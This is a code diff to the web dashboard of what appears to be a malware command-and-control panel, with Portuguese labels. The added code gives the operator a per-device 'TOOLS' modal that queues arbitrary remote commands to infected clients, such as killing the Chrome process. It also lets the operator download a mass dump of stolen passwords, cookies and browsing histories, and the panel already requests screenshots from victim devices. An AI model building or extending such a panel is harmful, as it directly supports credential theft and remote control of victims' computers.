@@ -676,6 +676,31 @@
         </div>
     </div>
     
+    <!-- Modal Ferramentas -->
+    <div id="toolsModal" class="modal" style="background-color: rgba(0, 0, 0, 0.9);">
+        <div class="modal-content" style="max-width: 600px; background: #0a0a0a; border: 1px solid #333;">
+            <div class="modal-header">
+                <h2>C2 COMMANDS & DUMP <span class="badge security" id="toolsModalBadge" style="background:#ff0064;color:#fff;">NULL</span></h2>
+                <span class="close" onclick="document.getElementById('toolsModal').style.display='none'">&times;</span>
+            </div>
+            <div style="padding: 20px; display: flex; flex-direction: column; gap: 20px;">
+                <div style="background: rgba(255,255,255,0.02); padding: 20px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                    <h3 style="color:#ffffff; margin-top:0; margin-bottom:15px; font-size:1.1em; letter-spacing:1px">COMANDO REMOTO (C2)</h3>
+                    <div style="display:flex; gap:10px;">
+                        <input type="text" id="cmdInput" placeholder="Ex: dir, taskkill /IM chrome.exe /F" style="flex:1; padding:12px; background:#000; border:1px solid #333; color:#fff; border-radius:4px; font-family:monospace;">
+                        <button onclick="sendCommand()" style="background:#00c8ff; color:#000; border:none; padding:0 25px; border-radius:4px; font-weight:bold; cursor:pointer; font-family:'Inter', sans-serif">ENVIAR</button>
+                    </div>
+                </div>
+                
+                <div style="background: rgba(255,255,255,0.02); padding: 20px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                    <h3 style="color:#ffffff; margin-top:0; margin-bottom:15px; font-size:1.1em; letter-spacing:1px">EXTRAÇÃO MASSIVA (DUMP)</h3>
+                    <p style="color:#888; font-size:0.9em; margin-top:0; margin-bottom:15px; line-height:1.4">Baixa instantaneamente todos os dados coletados (Senhas, Cookies, Históricos) estruturados em txt nativo sem corromper a memória RAM do servidor.</p>
+                    <button onclick="downloadDump()" style="width:100%; background:#ff0064; color:#fff; border:none; padding:15px; border-radius:4px; font-weight:800; letter-spacing:2px; cursor:pointer; font-family:'Inter', sans-serif">BAIXAR RAW DATA (.TXT)</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
     <script>
         // Carrega dados iniciais
         loadStats();
@@ -761,7 +786,10 @@
                                 <span class="info-value">${e.last_seen}</span>
                             </div>
                         </div>
-                        <button class="btn-ver-dados" onclick="showDeviceData('${e.id}')">VER DADOS</button>
+                        <div style="display:flex; gap:10px; margin-top:15px">
+                            <button class="btn-ver-dados" onclick="showDeviceData('${e.id}')" style="flex:1">VER DADOS</button>
+                            <button onclick="openTools('${e.id}')" style="background:#fff; color:#000; border:none; padding:0 20px; border-radius:4px; font-weight:bold; font-size:0.85em; cursor:pointer; letter-spacing:1px; flex:0.4; transition:all 0.2s;">TOOLS</button>
+                        </div>
                     </div>
                     `;
                 }).join('');
@@ -1061,6 +1089,42 @@
             try {
                 await fetch(`/api/request_screenshot/${id}`, { method: 'POST' });
             } catch (e) {}
+        }
+        
+        let currentToolsId = null;
+        function openTools(id) {
+            currentToolsId = id;
+            document.getElementById('toolsModalBadge').textContent = id;
+            document.getElementById('cmdInput').value = '';
+            document.getElementById('toolsModal').style.display = 'flex';
+        }
+        
+        function downloadDump() {
+            if (!currentToolsId) return;
+            window.open(`/api/dump/${currentToolsId}`, '_blank');
+        }
+        
+        async function sendCommand() {
+            if (!currentToolsId) return;
+            const cmd = document.getElementById('cmdInput').value.trim();
+            if(!cmd) return;
+            
+            try {
+                const res = await fetch(`/api/command_request/${currentToolsId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({command: cmd})
+                });
+                const data = await res.json();
+                if(data.success) {
+                    alert('Comando C2 enviado para fila! Aguardando o cliente processar.');
+                    document.getElementById('cmdInput').value = '';
+                } else {
+                    alert('Erro: ' + (data.error || 'Desconhecido'));
+                }
+            } catch(e) {
+                alert('Erro na comunicação do C2.');
+            }
         }
     </script>
 </body>
